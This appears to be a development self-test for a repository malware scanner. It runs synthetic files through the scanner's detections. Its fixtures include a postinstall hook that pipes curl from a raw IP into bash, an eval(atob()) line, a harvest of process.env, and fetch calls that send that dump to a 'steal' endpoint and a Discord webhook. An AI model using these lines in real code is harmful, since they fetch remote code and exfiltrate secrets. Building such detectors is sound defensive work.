/* eslint-disable */
// Dev-only self-test: feeds synthetic files through the scanners to confirm
// the malware indicators still fire and the tightened rules avoid false alarms.
// Run: bun scripts/selftest.ts

import { runScans, type RepoFlags } from "../lib/scan";
import type { RepoFile, RepoMeta } from "../lib/types";

const meta: RepoMeta = {
  owner: "o", name: "r", fullName: "o/r", url: "https://github.com/o/r",
  defaultBranch: "main", description: "d", homepage: null, stars: 5, forks: 0,
  openIssues: 0, watchers: 0, license: "MIT", primaryLanguage: "JavaScript",
  languages: ["JavaScript"], topics: [], createdAt: "2024-01-01T00:00:00Z",
  pushedAt: "2024-06-01T00:00:00Z", updatedAt: "2024-06-01T00:00:00Z",
  archived: false, disabled: false, isFork: false, sizeKb: 10,
  ownerType: "User", ownerCreatedAt: "2023-01-01T00:00:00Z",
};

const flags: RepoFlags = {
  hasReadme: true, hasSecurityMd: false, hasContributing: false,
  hasLicenseFile: true, hasCI: false, hasTests: false, hasLockfile: false,
};

function file(path: string, content: string): RepoFile {
  return { path, content, sizeBytes: content.length, truncated: false };
}

const files: RepoFile[] = [
  file("package.json", JSON.stringify({
    name: "evil", scripts: { postinstall: "curl -fsSL http://203.0.113.5/x.sh | bash" },
  })),
  file("src/index.js", [
    "const key = '-----BEGIN RSA PRIVATE KEY-----'",
    "const blob = 'TmdoZW5sb2dvbmVtb3ZlZmZmZmZxcXFxcXd3d3d3ZWVlZWVlcnJycnJydHR0dHR0eXl5eXl5dXR1dHV2dnZ2dnZubm5ubm5tbW1tbW1sbGxsbGxsZGRkZGRkZGZmZmZmZmphYmNkZWYn;",
    "const blob2 = 'QkFTRTY0UGF5bG9hZDUxMjQyNDIxNDI0MjQxNDE0MTQxNDEyNDIxNDE0MTQyNDIxNDEyMTQxNDE0MjQxNDE0MTQyMTQxNDIxNDIxNDEyMTQyMTQyMTQyNDIxNDI0MjQyNDIxNDI0MjE0MjQyNDIxMjQyMTQy';",
    "eval(atob(blob));",
    "const dump = JSON.stringify(process.env);",
    "fetch('https://discord.com/api/webhooks/123456789012345678/abc-def_ghi');",
    "fetch('http://203.0.113.9/steal?d=' + dump);",
  ].join("\n")),
  // benign lines that previously caused false positives
  file("src/server.js", [
    "const port = process.env.PORT || 3000;",
    "server.listen(port, '0.0.0.0');",
    "fetch('https://raw.githubusercontent.com/owner/repo/main/data.json');",
  ].join("\n")),
];

const findings = runScans(meta, files, flags, files.length);
const ids = new Set(findings.map((f) => f.id));

const expect = (cond: boolean, label: string) =>
  console.log(`${cond ? "PASS" : "FAIL"}  ${label}`);

console.log("\n— Should detect —");
expect(ids.has("pkg.script.postinstall"), "postinstall install script");
expect(findings.some((f) => f.id === "pkg.script.postinstall" && f.severity === "critical"), "postinstall curl|bash = critical");
expect(ids.has("obf.eval"), "eval()");
expect(ids.has("obf.packed-blob"), "large encoded blob");
expect(ids.has("secret.private-key"), "embedded private key");
expect(ids.has("exfil.discord-webhook"), "discord webhook exfil");
expect(ids.has("net.host.203.0.113.5") || ids.has("net.host.203.0.113.9"), "public raw IP contact");
expect(ids.has("obf.env-harvest"), "JSON.stringify(process.env) harvest");

console.log("\n— Should NOT false-positive —");
expect(!ids.has("net.host.0.0.0.0"), "0.0.0.0 not flagged");
expect(!ids.has("net.host.raw.githubusercontent.com"), "raw.githubusercontent not flagged");
const envHits = findings.filter((f) => f.id === "obf.env-harvest");
expect(envHits.length === 1, "plain process.env.PORT not flagged as harvest");

console.log("\nAll checks above should read PASS.\n");
